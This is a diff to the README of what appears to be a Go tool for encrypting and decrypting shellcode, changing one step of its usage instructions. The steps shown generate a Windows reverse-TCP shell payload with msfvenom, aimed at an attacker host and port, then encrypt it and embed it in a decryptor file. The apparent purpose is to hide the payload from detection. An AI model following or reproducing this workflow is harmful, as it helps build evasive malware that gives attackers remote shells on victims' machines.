@@ -34,7 +34,7 @@ This section lists all major frameworks/libraries used to create this project.
 ## Usage
 ### For Go
 1. msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f go 
-2. Remove "0x" and new line values
+2. Remove "\0x" and new line values
 3. Place the shellcode in the encryptGo.go file
 4. Execute the code
 5. Take the encrypted shellcode and place it in the decryptGo.go file
